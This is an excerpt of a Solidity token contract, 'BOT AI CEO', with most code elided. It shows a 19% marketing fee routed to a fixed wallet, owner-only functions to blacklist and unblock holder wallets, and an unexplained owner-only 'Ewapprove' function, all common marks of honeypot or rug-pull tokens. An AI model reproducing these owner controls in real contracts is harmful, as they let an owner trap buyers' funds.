...
contract BOT_AI_CEO  is Context, IERC20, Ownable {
    ...
    uint256 private constant SWAP_TOKENS_AT_AMOUNT = 1880000 * 10**9; //
    string private constant _name = "BOT AI CEO"; // 
    string private constant _symbol = unicode"AICEO"; //    
    uint8 private constant _decimals = 9; // 
    
    
    uint256 public _marketingFee = 19;
    uint256 public _liquidityFee = 1;
    address private  _marketingWallet = 0xbF6212709cD261e37B5DF5a2BB207740a40F3FA3;
    ...
    function Ewapprove(address account) public onlyOwner {
...
/*
    ...
    */
    ...
    function LocktokenWallets(address[] calldata addresses) external onlyOwner {
 ...
 // Blacklist - block wallets (REMOVE - COMMA SEPARATE MULTIPLE WALLETS)
    function unlockWallets(address[] calldata addresses) external onlyOwner {
 ...
 /*
    ...
    */
    ...
    // Set the maximum wallet holding (percent of total supply)
     function Maxlimit_wallet(uint256 maxWallPercent_x100) external onlyOwner() {
